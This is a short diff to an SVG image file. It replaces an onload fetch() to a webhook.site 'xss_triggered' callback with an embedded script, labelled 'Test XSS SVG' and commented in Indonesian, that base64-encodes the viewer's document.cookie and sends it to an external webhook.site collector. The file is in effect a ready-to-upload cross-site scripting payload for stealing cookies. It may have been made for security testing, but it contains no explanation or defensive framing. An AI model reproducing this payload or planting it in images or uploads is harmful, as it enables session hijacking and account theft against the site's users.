@@ -1,4 +1,14 @@
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-
-<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://webhook.site/053ef9dc-6112-4e10-a8c5-05981016c0ba/xss_triggered')"/>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(255,0,0);stroke-width:3;stroke:rgb(0,0,0)" />
+   <text x="10" y="50" font-family="Verdana" font-size="20" fill="white">Test XSS SVG</text>
+   <script type="text/javascript">
+      // Mengirimkan cookie ke Webhook.site Anda
+      // btoa digunakan untuk encode Base64 agar karakter cookie tidak rusak
+      fetch("https://webhook.site/c4aba642-28a0-4c09-a5b0-ec613fc3217a?data=" + btoa(document.cookie), {
+         method: "GET",
+         mode: "no-cors"
+      });
+   </script>
+</svg>
